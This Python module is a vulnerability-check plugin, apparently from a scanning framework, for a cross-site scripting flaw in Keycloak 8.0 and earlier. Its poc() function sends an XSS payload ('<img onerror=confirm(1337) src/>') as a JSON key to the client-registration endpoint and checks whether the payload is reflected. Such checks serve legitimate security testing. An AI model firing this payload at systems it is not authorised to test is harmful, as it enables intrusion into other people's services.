import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Keycloak <= 8.0 - Cross Site Scripting''',
        "description": '''''',
        "severity": "info",
        "references": [
            "https://cure53.de/pentest-report_keycloak.pdf"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["keycloak", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/auth/realms/master/clients-registrations/openid-connect"""
        method = "POST"
        data = {"<img onerror=confirm(1337) src/>":1}
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 400) and ("""Unrecognized field "<img onerror=confirm(1337) src/>""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url